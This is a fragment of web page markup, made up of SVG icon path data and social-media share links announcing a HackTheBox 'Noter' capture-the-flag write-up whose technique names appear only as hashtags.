		c0-12.94-1.91-25.406-5.715-37.402h38.547v185.014H388.865z M388.865,115.626c0,5.52-1.903,10.184-5.716,13.99
		c-3.805,3.809-8.466,5.711-13.989,5.711h-49.676c-5.517,0-10.185-1.903-13.99-5.711c-3.806-3.806-5.708-8.47-5.708-13.99V68.522
		c0-5.33,1.902-9.945,5.708-13.848c3.806-3.901,8.474-5.854,13.99-5.854h49.676c5.523,0,10.185,1.952,13.989,5.854
		c3.812,3.903,5.716,8.518,5.716,13.848V115.626z" /></symbol>
    <symbol id="icon-telegram" viewBox="0 0 80 80">
    <path d="M 70.511719 10.986328 C 69.833089 11.015588 69.157051 11.196735 68.537109 11.4375 L 68.535156 11.4375 C 67.931048 11.673297 64.049934 13.281226 58.392578 15.628906 C 52.735222 17.976586 45.3821 21.032905 38.091797 24.064453 C 23.51119 30.12755 9.1835937 36.091797 9.1835938 36.091797 L 9.2480469 36.068359 C 9.2480469 36.068359 8.4485192 36.330303 7.6484375 36.871094 C 7.2483967 37.141489 6.8283994 37.486951 6.4960938 37.966797 C 6.163788 38.446643 5.9299055 39.103809 6.0195312 39.808594 C 6.1812736 41.080477 7.0482024 41.912426 7.7636719 42.412109 C 8.4791414 42.911793 9.1660156 43.148437 9.1660156 43.148438 L 9.1738281 43.152344 L 23.1875 47.785156 C 23.418097 48.587707 27.163839 61.631062 28.046875 64.384766 C 28.50876 65.826709 28.935922 66.627156 29.335938 67.130859 C 29.535944 67.382711 29.733459 67.561543 29.931641 67.683594 C 30.016841 67.736064 30.101273 67.771554 30.183594 67.802734 C 30.197014 67.807834 30.211349 67.817736 30.224609 67.822266 C 30.252855 67.83191 30.267938 67.831811 30.302734 67.839844 C 31.62302 68.328201 32.738281 67.476563 32.738281 67.476562 L 32.769531 67.453125 L 42.376953 59 L 56.585938 70.394531 L 56.710938 70.449219 C 58.991132 71.431474 60.875783 70.891854 61.970703 70.027344 C 63.065623 69.162833 63.509766 68.03125 63.509766 68.03125 L 63.544922 67.943359 L 73.794922 16.097656 C 74.046117 14.98858 74.071392 14.057617 73.853516 13.257812 C 73.635643 12.458006 73.128863 11.807693 72.5 11.443359 C 71.871137 11.079025 71.190348 10.957066 70.511719 10.986328 z M 70.566406 13.021484 C 70.96444 13.004357 71.29991 13.059037 71.498047 13.173828 C 71.696183 13.288619 71.824951 13.420226 71.923828 13.783203 C 72.022708 14.14618 72.046557 14.758873 71.84375 15.654297 L 71.839844 15.667969 L 61.630859 67.3125 C 61.615849 67.34707 61.352842 67.965627 60.730469 68.457031 C 60.102941 68.952505 59.248838 69.318622 57.578125 68.626953 L 34.738281 50.310547 A 1.0001 1.0001 0 0 0 34 50 A 1.0001 1.0001 0 0 0 32.988281 50.974609 L 30.384766 64.923828 C 30.251656 64.61729 30.108215 64.257609 29.953125 63.773438 C 29.147161 61.260079 25.522903 48.675314 25.166016 47.435547 L 61.013672 24.226562 A 1.0001 1.0001 0 0 0 62 25 A 1.0001 1.0001 0 0 0 62.988281 23.783203 C 63.014848 23.477186 62.989225 23.17624 62.855469 22.876953 C 62.639651 22.394056 62.128723 22.100054 61.765625 22.03125 C 61.039429 21.893642 60.566406 22.158203 60.566406 22.158203 L 60.466797 22.195312 L 23.857422 45.900391 L 9.8261719 41.261719 L 9.8222656 41.259766 C 9.8185507 41.25848 9.3777555 41.099419 8.9082031 40.771484 C 8.4366726 40.442168 8.062164 40.014757 8.0039062 39.556641 C 7.9835322 39.396426 8.0143062 39.287873 8.140625 39.105469 C 8.2669443 38.923065 8.501119 38.707449 8.7675781 38.527344 C 9.3004964 38.167134 9.8886719 37.962891 9.8886719 37.962891 L 9.9199219 37.951172 L 9.953125 37.9375 C 9.953125 37.9375 24.279232 31.97306 38.859375 25.910156 C 46.149446 22.878704 53.503668 19.823883 59.160156 17.476562 C 64.816644 15.129243 68.856374 13.458984 69.261719 13.300781 C 69.707777 13.127547 70.168373 13.038612 70.566406 13.021484 z M 59.199219 25.699219 L 58.398438 26.101562 L 58.240234 26.984375 L 58.853516 27.638672 L 59.199219 27.699219 L 60 27.298828 L 60.158203 26.416016 L 59.546875 25.761719 L 59.199219 25.699219 z M 56.400391 28.400391 L 55.599609 28.800781 L 55.441406 29.683594 L 56.052734 30.337891 L 56.400391 30.400391 L 57.201172 29.998047 L 57.359375 29.117188 L 56.746094 28.462891 L 56.400391 28.400391 z M 53.599609 31.099609 L 52.798828 31.501953 L 52.640625 32.382812 L 53.251953 33.037109 L 53.599609 33.099609 L 54.400391 32.699219 L 54.558594 31.816406 L 53.947266 31.162109 L 53.599609 31.099609 z M 50.800781 33.800781 L 49.998047 34.201172 L 49.841797 35.083984 L 50.453125 35.738281 L 50.800781 35.800781 L 51.601562 35.398438 L 51.759766 34.517578 L 51.146484 33.861328 L 50.800781 33.800781 z M 48 36.5 L 47.199219 36.902344 L 47.041016 37.783203 L 47.652344 38.4375 L 48 38.5 L 48.800781 38.099609 L 48.958984 37.216797 L 48.347656 36.5625 L 48 36.5 z M 45.199219 39.199219 L 44.398438 39.601562 L 44.240234 40.484375 L 44.853516 41.138672 L 45.199219 41.199219 L 46.001953 40.798828 L 46.158203 39.916016 L 45.546875 39.261719 L 45.199219 39.199219 z M 42.400391 41.900391 L 41.599609 42.300781 L 41.441406 43.183594 L 42.052734 43.837891 L 42.400391 43.900391 L 43.201172 43.498047 L 43.359375 42.617188 L 42.746094 41.962891 L 42.400391 41.900391 z M 39.599609 44.599609 L 38.798828 45.001953 L 38.640625 45.882812 L 39.253906 46.537109 L 39.599609 46.599609 L 40.400391 46.199219 L 40.558594 45.316406 L 39.947266 44.662109 L 39.599609 44.599609 z M 36.800781 47.300781 L 35.998047 47.701172 L 35.841797 48.583984 L 36.453125 49.238281 L 36.800781 49.300781 L 37.601562 48.898438 L 37.759766 48.015625 L 37.146484 47.361328 L 36.800781 47.300781 z M 34.675781 52.824219 L 40.794922 57.730469 L 32.378906 65.132812 L 34.675781 52.824219 z" />
     </symbol>
     <symbol id="icon-youtube" viewBox="0 0 24 24">
       <path d="M4.652 0h1.44l.988 3.702.916-3.702h1.454l-1.665 5.505v3.757h-1.431v-3.757l-1.702-5.505zm6.594 2.373c-1.119 0-1.861.74-1.861 1.835v3.349c0 1.204.629 1.831 1.861 1.831 1.022 0 1.826-.683 1.826-1.831v-3.349c0-1.069-.797-1.835-1.826-1.835zm.531 5.127c0 .372-.19.646-.532.646-.351 0-.554-.287-.554-.646v-3.179c0-.374.172-.651.529-.651.39 0 .557.269.557.651v3.179zm4.729-5.07v5.186c-.155.194-.5.512-.747.512-.271 0-.338-.186-.338-.46v-5.238h-1.27v5.71c0 .675.206 1.22.887 1.22.384 0 .918-.2 1.468-.853v.754h1.27v-6.831h-1.27zm2.203 13.858c-.448 0-.541.315-.541.763v.659h1.069v-.66c.001-.44-.092-.762-.528-.762zm-4.703.04c-.084.043-.167.109-.25.198v4.055c.099.106.194.182.287.229.197.1.485.107.619-.067.07-.092.105-.241.105-.449v-3.359c0-.22-.043-.386-.129-.5-.147-.193-.42-.214-.632-.107zm4.827-5.195c-2.604-.177-11.066-.177-13.666 0-2.814.192-3.146 1.892-3.167 6.367.021 4.467.35 6.175 3.167 6.367 2.6.177 11.062.177 13.666 0 2.814-.192 3.146-1.893 3.167-6.367-.021-4.467-.35-6.175-3.167-6.367zm-12.324 10.686h-1.363v-7.54h-1.41v-1.28h4.182v1.28h-1.41v7.54zm4.846 0h-1.21v-.718c-.223.265-.455.467-.696.605-.652.374-1.547.365-1.547-.955v-5.438h1.209v4.988c0 .262.063.438.322.438.236 0 .564-.303.711-.487v-4.939h1.21v6.506zm4.657-1.348c0 .805-.301 1.431-1.106 1.431-.443 0-.812-.162-1.149-.583v.5h-1.221v-8.82h1.221v2.84c.273-.333.644-.608 1.076-.608.886 0 1.18.749 1.18 1.631v3.609zm4.471-1.752h-2.314v1.228c0 .488.042.91.528.91.511 0 .541-.344.541-.91v-.452h1.245v.489c0 1.253-.538 2.013-1.813 2.013-1.155 0-1.746-.842-1.746-2.013v-2.921c0-1.129.746-1.914 1.837-1.914 1.161 0 1.721.738 1.721 1.914v1.656z" />
    </symbol>
    <symbol id="icon-gitlab" viewBox="-5 -15 220 200">
      <path d="M105.0614,193.655 L105.0614,193.655 L143.7014,74.734 L66.4214,74.734 L105.0614,193.655 L105.0614,193.655 Z" />
      <path d="M105.0614,193.6548 L66.4214,74.7338 L12.2684,74.7338 L105.0614,193.6548 Z" />
      <path d="M12.2685,74.7341 L12.2685,74.7341 L0.5265,110.8731 C-0.5445,114.1691 0.6285,117.7801 3.4325,119.8171 L105.0615,193.6551 L12.2685,74.7341 Z" />
      &lt;path d="M12.2685,74.7342 L66.4215,74.7342 L43.1485,3.1092 C41.9515,-0.5768 36.7375,-0.5758 35.5405,3.1092 L12.2685,74.7342 Z" "/&gt;
      <path d="M105.0614,193.6548 L143.7014,74.7338 L197.8544,74.7338 L105.0614,193.6548 Z" />
      <path d="M197.8544,74.7341 L197.8544,74.7341 L209.5964,110.8731 C210.6674,114.1691 209.4944,117.7801 206.6904,119.8171 L105.0614,193.6551 L197.8544,74.7341 Z" />
      <path d="M197.8544,74.7342 L143.7014,74.7342 L166.9744,3.1092 C168.1714,-0.5768 173.3854,-0.5758 174.5824,3.1092 L197.8544,74.7342 Z" />
    </symbol>
</defs></svg>

<p><br /></p>
<section class="share">

    <h2>Share</h2>

    <a aria-label="Share on Twitter" href="https://twitter.com/intent/tweet?text=HackTheBox &quot;Noter&quot; wirteup is now available!%20http://charming-cuchufli-c1e963.netlify.app/writeups/HackTheBox/2022-09-04-Noter/%20via%20&#64;0xbro1&amp;hashtags=CKEditor,,Linux,,MySQL,,MySQL-privesc,,RCE,,UDF-privesc,,authentication-bypass,,code-review,,command-injection,,flask,,flask-session-cookie-bruteforce,,hardcoded-credentials,,insecure-credentials,,md-to-pdf,,python-coding,,user-enumeration," onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;" title="Share on Twitter">
        <svg class="icon icon-twitter"><use xlink:href="#icon-twitter"></use></svg>
    </a>

    <a aria-label="Share on Facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://charming-cuchufli-c1e963.netlify.app/writeups/HackTheBox/2022-09-04-Noter/" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;" title="Share on Facebook">
        <svg class="icon icon-facebook"><use xlink:href="#icon-facebook"></use></svg>
    </a>

    <a aria-label="Share on Linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://charming-cuchufli-c1e963.netlify.app/writeups/HackTheBox/2022-09-04-Noter/&amp;title=Noter&amp;summary=&amp;source=
    " onclick="window.open(this.href, 'linkedin-share','width=580,height=296');return false;" title="Share on Linkedin">
        <svg class="icon icon-linkedin"><use xlink:href="#icon-linkedin"></use></svg>
    </a>

</section>

:ET